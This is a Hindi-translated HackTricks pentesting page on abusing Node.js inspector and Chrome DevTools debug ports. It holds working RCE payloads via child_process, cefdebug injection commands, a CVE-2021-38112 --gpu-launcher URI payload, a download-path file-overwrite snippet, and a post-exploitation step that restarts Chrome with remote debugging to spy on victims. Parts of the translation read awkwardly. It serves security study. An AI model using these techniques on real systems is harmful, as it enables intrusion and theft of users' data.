# नोड इंस्पेक्टर/CEF डीबग दुरुपयोग

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> के साथ जीरो से हीरो तक AWS हैकिंग सीखें</summary>

HackTricks का समर्थन करने के अन्य तरीके:

* अगर आप अपनी कंपनी का विज्ञापन **HackTricks** में देखना चाहते हैं या **HackTricks को PDF में डाउनलोड** करना चाहते हैं तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) और हमें **ट्विटर** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live) पर **फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें** द्वारा PRs सबमिट करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

## मूल जानकारी

[दस्तावेज़ से](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): `--inspect` स्विच के साथ शुरू किया जाए, तो एक नोड.जेएस प्रक्रिया एक डीबगिंग क्लाइंट के लिए सुनती है। **डिफ़ॉल्ट** रूप से, यह होस्ट और पोर्ट **`127.0.0.1:9229`** पर सुनेगा। प्रत्येक प्रक्रिया को एक **अद्वितीय** **UUID** भी सौंपा जाता है।

इंस्पेक्टर क्लाइंट्स को होस्ट पता, पोर्ट, और UUID को जोड़ना चाहिए और निर्दिष्ट करना चाहिए ताकि वे कनेक्ट कर सकें। पूरा URL कुछ इस प्रकार दिखेगा `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`।

{% hint style="warning" %}
क्योंकि **डीबगर को नोड.जेएस निष्पादन वातावरण का पूरा एक्सेस** होता है, इस पोर्ट से कनेक्ट करने की क्षमता वाला एक दुर्भाग्यपूर्ण अभिनेता नोड.जेएस प्रक्रिया के पक्ष में अर्बिट्रे कोड का निष्पादन कर सकता है (**संभावित प्रिविलेज उन्नति**।)
{% endhint %}

इंस्पेक्टर शुरू करने के कई तरीके हैं:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
जब आप एक inspected process शुरू करते हैं तो कुछ इस तरह का दिखाई देगा:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
**CEF** (**Chromium Embedded Framework**) जैसे प्रक्रियाएँ **डीबगर** (SSRF सुरक्षा बहुत ही समान रहती है) खोलने के लिए पैरामीटर का उपयोग करने की आवश्यकता है: `--remote-debugging-port=9222`। हालांकि, ये **NodeJS** **डीबग** सत्र की अनुमति देने की बजाय ब्राउज़र के साथ [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) का उपयोग करेंगे, यह ब्राउज़र को नियंत्रित करने के लिए एक इंटरफेस है, लेकिन यह सीधा RCE नहीं है।

जब आप डीबग किए गए ब्राउज़र को शुरू करते हैं तो कुछ इस प्रकार दिखाई देगा:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### ब्राउज़र, वेबसॉकेट और समान-मूल नीति <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

वेब-ब्राउज़र में खुली वेबसाइटें ब्राउज़र सुरक्षा मॉडल के तहत WebSocket और HTTP अनुरोध कर सकती हैं। **एक प्रारंभिक HTTP कनेक्शन** को **एक अद्वितीय डीबगर सत्र आईडी प्राप्त करने** के लिए आवश्यक है। **समान मूल नीति** वेबसाइटों को **इस HTTP कनेक्शन** को बनाने से रोकती है। [**DNS rebinding हमलों**](https://en.wikipedia.org/wiki/DNS\_rebinding)**** के खिलाफ अतिरिक्त सुरक्षा के लिए, Node.js सत्यापित करता है कि कनेक्शन के लिए **'Host' हेडर्स** निश्चित रूप से **एक आईपी पता** या **`localhost`** या **`localhost6`** निर्दिष्ट करते हैं।

{% hint style="info" %}
यह **सुरक्षा उपाय इंस्पेक्टर का शोषण करने से रोकता है** कोड चलाने के लिए **बस एक HTTP अनुरोध भेजकर** (जो एक SSRF vuln का शोषण किया जा सकता था)।
{% endhint %}

### चल रहे प्रक्रियाओं में इंस्पेक्टर शुरू करना

आप एक चल रहे nodejs प्रक्रिया को **डिफ़ॉल्ट पोर्ट में इंस्पेक्टर शुरू** करने के लिए **सिग्नल SIGUSR1** भेज सकते हैं। हालांकि, ध्यान दें कि आपके पास पर्याप्त विशेषाधिकार होने चाहिए, इसलिए यह आपको प्रक्रिया के अंदर की जानकारी तक के लिए **विशेषाधिकारित पहुंच** दे सकता है लेकिन सीधा प्रिविलेज उन्नति नहीं।
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
यह कंटेनर में उपयोगी है क्योंकि **प्रक्रिया को बंद करके एक नया प्रक्रिया शुरू करना** `--inspect` के साथ **एक विकल्प नहीं** है क्योंकि **कंटेनर** के साथ **प्रक्रिया** को **मार दिया जाएगा**।
{% endhint %}

### इंस्पेक्टर/डीबगर से कनेक्ट करें

**क्रोमियम-आधारित ब्राउज़र** से कनेक्ट करने के लिए, Chrome या Edge के लिए `chrome://inspect` या `edge://inspect` URL का उपयोग किया जा सकता है। Configure बटन पर क्लिक करके, सुनिश्चित किया जाना चाहिए कि **लक्षित होस्ट और पोर्ट** सही ढंग से सूचीबद्ध हैं। छवि में एक रिमोट कोड निषेधन (RCE) उदाहरण दिखाया गया है:

![](<../../.gitbook/assets/image (620) (1).png>)

**कमांड लाइन** का उपयोग करके आप डीबगर/इंस्पेक्टर से कनेक्ट कर सकते हैं:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
यह उपकरण [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), स्थानीय रूप से चल रहे **इंस्पेक्टर्स** को **खोजने** और उनमें **कोड इंजेक्ट** करने की अनुमति देता है।
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
ध्यान दें कि **NodeJS RCE उत्पादन** काम नहीं करेंगे अगर [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) के माध्यम से ब्राउज़र से कनेक्ट किया गया है (आपको इसके साथ करने के लिए दिलचस्प चीजें खोजने के लिए API की जाँच करनी होगी)।
{% endhint %}

## NodeJS Debugger/Inspector में RCE

{% hint style="info" %}
यदि आप यहाँ आकर [**Electron में XSS से RCE कैसे प्राप्त करें इस पृष्ठ की जाँच करें।**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endhint %}

कुछ सामान्य तरीके **RCE** प्राप्त करने के लिए जब आप एक Node **inspector** से **कनेक्ट** कर सकते हैं उसका उपयोग करना है (ऐसा लगता है कि यह **Chrome DevTools protocol** के साथ कनेक्शन में काम नहीं करेगा)।
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Chrome DevTools Protocol Payloads

आप यहाँ API देख सकते हैं: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
इस खंड में मैं बस उन दिलचस्प चीजों की सूची देने वाला हूं जिन्हें लोग इस protocol का दुरुपयोग करने के लिए प्रयोग किया है।

### गहरे लिंक के माध्यम से पैरामीटर इंजेक्शन

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) में Rhino सुरक्षा ने पाया कि CEF पर आधारित एक एप्लिकेशन ने सिस्टम में एक कस्टम URI (workspaces://) रजिस्टर किया था जो पूर्ण URI को प्राप्त करता था और फिर उस URI से आंशिक रूप से निर्मित एक विन्यास के साथ CEF पर आधारित एप्लिकेशन को लॉन्च करता था।

पाया गया कि URI पैरामीटर URL डीकोड किए गए थे और CEF आधारित एप्लिकेशन को लॉन्च करने के लिए उपयोग किए गए थे, जिससे उपयोगकर्ता को कमांड लाइन में ध्यान देने के लिए ध्वज **`--gpu-launcher`** इंजेक्ट करने की अनुमति थी और विविध चीजें चलाने की अनुमति थी।

तो, एक पेलोड जैसे:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
### फ़ाइलें अधिलेखित करें

**डाउनलोड की गई फ़ाइलें को बचाया जाएगा** के लिए फ़ोल्डर बदलें और एक फ़ाइल डाउनलोड करें जिससे आप अपने **हानिकारक कोड** के साथ एप्लिकेशन के उपयोग किए जाने वाले **स्रोत कोड** को **अधिलेखित** कर सकते हैं।
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Webdriver RCE और डेटा उत्पीड़न

इस पोस्ट के अनुसार: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) थेरिवर से RCE प्राप्त करना और आंतरिक पेजों को डेटा उत्पीड़ित करना संभव है।

### पोस्ट-एक्सप्लोइटेशन

एक वास्तविक वातावरण में और **एक उपयोगकर्ता PC को कंप्रमाइज़ करने के बाद** जो Chrome/Chromium आधारित ब्राउज़र का उपयोग करता है, आप डीबगिंग सक्रिय करके एक Chrome प्रक्रिया शुरू कर सकते हैं और डीबगिंग पोर्ट को फॉरवर्ड कर सकते हैं ताकि आप इसे एक्सेस कर सकें। इस तरह आप **विक्टिम जो Chrome के साथ कुछ भी करता है की सभी जांच कर सकें और संवेदनशील जानकारी चुरा सकेंगे**।

गुप्त तरीका यह है कि **हर Chrome प्रक्रिया को समाप्त करें** और फिर कुछ इस तरह का कॉल करें
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## संदर्भ

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks) github रेपो में PR जमा करके।

</details>
